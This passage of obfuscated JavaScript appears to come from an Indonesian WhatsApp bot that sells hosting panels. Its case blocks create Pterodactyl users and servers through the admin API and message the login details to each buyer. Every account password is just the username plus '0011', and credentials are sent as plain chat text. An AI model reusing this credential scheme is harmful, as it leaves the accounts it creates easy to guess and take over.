              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x47c478.id);
          ctf = "Hai @" + _0x46143e.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x47c478.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x781db2 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x46143e, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x51a7ed = await _0x4ff9bb.json();
          let _0x4ca3b4 = _0x51a7ed.attributes.startup;
          let _0x47d846 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x44f4ef,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x47c478.id,
              'egg': parseInt(_0x262b6f),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x4ca3b4,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "18240",
                'swap': 0x0,
                'disk': "18240",
                'io': 0x1f4,
                'cpu': "480"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0xe417af)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x3b5fd4 = await _0x47d846.json();
          if (_0x3b5fd4.errors) {
            return _0x427bb7(JSON.stringify(_0x3b5fd4.errors[0x0], null, 0x2));
          }
        }
        break;
      case "17gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x341a8f = _0x4ec028.split(',');
          if (_0x341a8f.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0xa9dd5e = _0x341a8f[0x0];
          let _0x13f0cd = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x341a8f[0x1] ? _0x341a8f[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x42fc33 = _0xa9dd5e + "17GB";
          let _0x96a4f9 = global.eggsnya;
          let _0x850e7b = global.location;
          let _0x10afe7 = _0xa9dd5e + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x13f0cd) {
            return;
          }
          let _0x357bb0 = _0xa9dd5e + "0011";
          let _0x58c3cb = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x10afe7,
              'username': _0xa9dd5e,
              'first_name': _0xa9dd5e,
              'last_name': _0xa9dd5e,
              'language': 'en',
              'password': _0x357bb0
            })
          });
          let _0x4c1dfe = await _0x58c3cb.json();
          if (_0x4c1dfe.errors) {
            return _0x427bb7(JSON.stringify(_0x4c1dfe.errors[0x0], null, 0x2));
          }
          let _0x1cd556 = _0x4c1dfe.attributes;
          let _0x27a5e6 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x96a4f9, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x1cd556.id);
          ctf = "Hai @" + _0x13f0cd.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x1cd556.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x357bb0 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x13f0cd, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0xd9fa3 = await _0x27a5e6.json();
          let _0x479e8b = _0xd9fa3.attributes.startup;
          let _0x4c5497 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x42fc33,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x1cd556.id,
              'egg': parseInt(_0x96a4f9),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x479e8b,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "17240",
                'swap': 0x0,
                'disk': "17240",
                'io': 0x1f4,
                'cpu': "450"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x850e7b)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x17581a = await _0x4c5497.json();
          if (_0x17581a.errors) {
            return _0x427bb7(JSON.stringify(_0x17581a.errors[0x0], null, 0x2));
          }
        }
        break;
      case "10gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x1ba846 = _0x4ec028.split(',');
          if (_0x1ba846.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x4ffa67 = _0x1ba846[0x0];
          let _0x44591c = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x1ba846[0x1] ? _0x1ba846[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0xdcb293 = _0x4ffa67 + "10GB";
          let _0x46d0b6 = global.eggsnya;
          let _0x1ad25a = global.location;
          let _0x2a4c74 = _0x4ffa67 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x44591c) {
            return;
          }
          let _0x4ea5ee = _0x4ffa67 + "0011";
          let _0x4a5959 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x2a4c74,
              'username': _0x4ffa67,
              'first_name': _0x4ffa67,
              'last_name': _0x4ffa67,
              'language': 'en',
              'password': _0x4ea5ee
            })
          });
          let _0x38aead = await _0x4a5959.json();
          if (_0x38aead.errors) {
            return _0x427bb7(JSON.stringify(_0x38aead.errors[0x0], null, 0x2));
          }
          let _0x287417 = _0x38aead.attributes;
          let _0x5aac9c = await fetch(domain + "/api/application/nests/5/eggs/" + _0x46d0b6, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x287417.id);
          ctf = "Hai @" + _0x44591c.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x287417.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x4ea5ee + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x44591c, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x52af2f = await _0x5aac9c.json();
          let _0x17242f = _0x52af2f.attributes.startup;
          let _0xcc7147 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0xdcb293,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x287417.id,
              'egg': parseInt(_0x46d0b6),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x17242f,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "10240",
                'swap': 0x0,
                'disk': "10240",
                'io': 0x1f4,
                'cpu': "250"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x1ad25a)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0xf66f16 = await _0xcc7147.json();
          if (_0xf66f16.errors) {
            return _0x427bb7(JSON.stringify(_0xf66f16.errors[0x0], null, 0x2));
          }
        }
        break;
      case "15gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x1534d4 = _0x4ec028.split(',');
          if (_0x1534d4.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x24bd52 = _0x1534d4[0x0];
          let _0x17628b = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x1534d4[0x1] ? _0x1534d4[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x26f02b = _0x24bd52 + "15GB";
          let _0x30b49a = global.eggsnya;
          let _0x5b7fea = global.location;
          let _0x1cfd81 = _0x24bd52 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x17628b) {
            return;
          }
          let _0x490da1 = _0x24bd52 + "0011";
          let _0x2ac369 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x1cfd81,
              'username': _0x24bd52,
              'first_name': _0x24bd52,
              'last_name': _0x24bd52,
              'language': 'en',
              'password': _0x490da1
            })
          });
          let _0x5d139 = await _0x2ac369.json();
          if (_0x5d139.errors) {
            return _0x427bb7(JSON.stringify(_0x5d139.errors[0x0], null, 0x2));
          }
          let _0x43b9fc = _0x5d139.attributes;
          let _0x4a1ca3 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x30b49a, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x43b9fc.id);
          ctf = "Hai @" + _0x17628b.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x43b9fc.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x490da1 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x17628b, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x149210 = await _0x4a1ca3.json();
          let _0x2d6b1c = _0x149210.attributes.startup;
          let _0x5bd8df = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x26f02b,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x43b9fc.id,
              'egg': parseInt(_0x30b49a),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x2d6b1c,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "15240",
                'swap': 0x0,
                'disk': "15240",
                'io': 0x1f4,
                'cpu': "420"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x5b7fea)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x566bc1 = await _0x5bd8df.json();
          if (_0x566bc1.errors) {
            return _0x427bb7(JSON.stringify(_0x566bc1.errors[0x0], null, 0x2));
          }
        }
        break;
      case "16gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x1821cb = _0x4ec028.split(',');
          if (_0x1821cb.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x3efe0d = _0x1821cb[0x0];
          let _0x2cb159 = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x1821cb[0x1] ? _0x1821cb[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x5032ce = _0x3efe0d + "16GB";
          let _0x49b3cc = global.eggsnya;
          let _0x54d294 = global.location;
          let _0x1e1a84 = _0x3efe0d + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x2cb159) {
            return;
          }
          let _0x2e85ea = _0x3efe0d + "0011";
          let _0x450f5f = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x1e1a84,
              'username': _0x3efe0d,
              'first_name': _0x3efe0d,
              'last_name': _0x3efe0d,
              'language': 'en',
              'password': _0x2e85ea
            })
          });
          let _0x32b20c = await _0x450f5f.json();
          if (_0x32b20c.errors) {
            return _0x427bb7(JSON.stringify(_0x32b20c.errors[0x0], null, 0x2));
          }
          let _0x1e1940 = _0x32b20c.attributes;
          let _0x85e7f0 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x49b3cc, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x1e1940.id);
          ctf = "Hai @" + _0x2cb159.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x1e1940.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x2e85ea + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x2cb159, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x456acc = await _0x85e7f0.json();
          let _0x45a849 = _0x456acc.attributes.startup;
          let _0x573fe9 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x5032ce,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x1e1940.id,
              'egg': parseInt(_0x49b3cc),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x45a849,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "16240",
                'swap': 0x0,
                'disk': "16240",
                'io': 0x1f4,
                'cpu': "410"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x54d294)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x2d4763 = await _0x573fe9.json();
          if (_0x2d4763.errors) {
            return _0x427bb7(JSON.stringify(_0x2d4763.errors[0x0], null, 0x2));
          }
        }
        break;
      case "14gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x7d20b = _0x4ec028.split(',');
          if (_0x7d20b.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x2faea3 = _0x7d20b[0x0];
          let _0x484335 = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x7d20b[0x1] ? _0x7d20b[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x266f9a = _0x2faea3 + "14GB";
          let _0x3f1c3a = global.eggsnya;
          let _0x3d05d1 = global.location;
          let _0x3f42f1 = _0x2faea3 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x484335) {
            return;
          }
          let _0x29d903 = _0x2faea3 + "0011";
          let _0x2692f7 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x3f42f1,
              'username': _0x2faea3,
              'first_name': _0x2faea3,
              'last_name': _0x2faea3,
              'language': 'en',
              'password': _0x29d903
            })
          });
          let _0x427962 = await _0x2692f7.json();
          if (_0x427962.errors) {
            return _0x427bb7(JSON.stringify(_0x427962.errors[0x0], null, 0x2));
          }
          let _0x2fd18c = _0x427962.attributes;
          let _0x5d9cba = await fetch(domain + "/api/application/nests/5/eggs/" + _0x3f1c3a, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x2fd18c.id);
          ctf = "Hai @" + _0x484335.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x2fd18c.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x29d903 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x484335, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x50844b = await _0x5d9cba.json();
          let _0x2dc604 = _0x50844b.attributes.startup;
          let _0x3b5aa9 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x266f9a,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x2fd18c.id,
              'egg': parseInt(_0x3f1c3a),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x2dc604,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "14240",
                'swap': 0x0,
                'disk': "14240",
                'io': 0x1f4,
                'cpu': "360"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x3d05d1)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x83a004 = await _0x3b5aa9.json();
          if (_0x83a004.errors) {
            return _0x427bb7(JSON.stringify(_0x83a004.errors[0x0], null, 0x2));
          }
        }
        break;
      case "13gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x34197f = _0x4ec028.split(',');
          if (_0x34197f.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x3d18fb = _0x34197f[0x0];
          let _0x180ca7 = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x34197f[0x1] ? _0x34197f[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x481881 = _0x3d18fb + "13GB";
          let _0x496ff5 = global.eggsnya;
          let _0x224f4c = global.location;
          let _0x2b1df3 = _0x3d18fb + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x180ca7) {
            return;
          }
          let _0xc2e0c4 = _0x3d18fb + "0011";
          let _0x2c8a1d = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x2b1df3,
              'username': _0x3d18fb,
              'first_name': _0x3d18fb,
              'last_name': _0x3d18fb,
              'language': 'en',
              'password': _0xc2e0c4
            })
          });
          let _0xbb12ff = await _0x2c8a1d.json();
          if (_0xbb12ff.errors) {
            return _0x427bb7(JSON.stringify(_0xbb12ff.errors[0x0], null, 0x2));
          }
          let _0x48c4e8 = _0xbb12ff.attributes;
          let _0x303117 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x496ff5, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x48c4e8.id);
          ctf = "Hai @" + _0x180ca7.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x48c4e8.username + "\n⎙─➤ *🔐PASSWORD* : " + _0xc2e0c4 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x180ca7, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0xdc8780 = await _0x303117.json();
          let _0x559cdb = _0xdc8780.attributes.startup;
          let _0x265d30 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x481881,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x48c4e8.id,
